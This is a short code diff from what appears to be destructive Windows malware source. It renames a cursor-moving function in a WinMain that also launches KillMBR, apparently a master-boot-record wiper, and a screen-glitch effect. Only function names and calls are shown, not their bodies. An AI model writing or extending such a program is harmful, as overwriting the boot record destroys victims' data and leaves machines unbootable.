@@ -12,7 +12,7 @@ int APIENTRY WinMain(HINSTANCE inst, HINSTANCE prevInst, LPTSTR cmdLine, int cmd
     future<int> mbr_func = async(KillMBR);
 
     // ---- HID FUNCTIONS ----
-    future<int> cursor_func = async(CursorJiggle);
+    future<int> cursor_func = async(MoveCursor);
 
     // ---- SCREEN EFFECTS ----
     future<int> patchify_func = async(ScreenPatchify);
